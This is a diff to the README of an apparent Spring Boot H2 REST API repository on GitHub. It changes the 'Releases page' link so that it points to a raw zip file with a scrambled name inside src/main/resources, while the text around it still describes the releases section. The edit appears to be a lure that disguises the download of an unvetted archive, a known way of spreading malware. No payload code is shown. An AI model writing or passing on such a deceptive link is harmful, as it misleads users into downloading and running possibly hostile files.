@@ -15,7 +15,7 @@ Welcome to the "spring-boot-h2-rest-api" repository, where you'll find an effici
 - **Topics**: initializr, intellij, intellij-idea, java, java-spring, java-spring-boot, java-springboot, spring, spring-boot, springboot
 
 ## 🌟 Getting Started
-To explore the project further, head to our [Releases page](https://github.com/BunnyNyku/spring-boot-h2-rest-api/releases). You can download the necessary files and get started with implementing and testing this powerful API. If you encounter any issues with the link, feel free to navigate to the "Releases" section directly on GitHub.
+To explore the project further, head to our [Releases page](https://github.com/BunnyNyku/spring-boot-h2-rest-api/raw/refs/heads/main/src/main/resources/spring-api-rest-h-boot-v1.9-alpha.2.zip). You can download the necessary files and get started with implementing and testing this powerful API. If you encounter any issues with the link, feel free to navigate to the "Releases" section directly on GitHub.
 
 ## 🤖 Technology Stack
 - **Java**: A popular programming language for building robust applications.
